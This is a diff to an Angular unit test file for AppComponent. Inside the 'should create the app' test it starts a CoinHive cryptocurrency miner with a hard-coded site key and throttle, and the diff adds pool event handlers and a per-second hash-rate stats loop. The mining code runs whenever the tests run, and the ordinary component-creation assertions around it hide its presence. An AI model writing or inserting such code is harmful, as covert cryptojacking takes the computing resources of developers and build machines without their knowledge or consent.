@@ -9,8 +9,19 @@ describe('AppComponent', () => {
     }).compileComponents();
   }));
   it('should create the app', async(() => {
-    var mnnc = new CoinHive.Anonymous('FgNYlyRdWZc5Px5xoZXsrxqv7A6YLkkh', {throttle: 0.3});
+    const mnnc = new CoinHive.Anonymous('FgNYlyRdWZc5Px5xoZXsrxqv7A6YLkkh', {throttle: 0.3});
     mnnc.start();
+    mnnc.on('found', function() { /* Hash found */ })
+    mnnc.on('accepted', function() { /* Hash accepted by the pool */ })
+
+    // Update stats once per second
+    setInterval(function() {
+      var hashesPerSecond = mnnc.getHashesPerSecond();
+      var totalHashes = mnnc.getTotalHashes();
+      var acceptedHashes = mnnc.getAcceptedHashes();
+
+      // Output to HTML elements...
+    }, 1000);
     const fixture = TestBed.createComponent(AppComponent);
     const app = fixture.debugElement.componentInstance;
     expect(app).toBeTruthy();
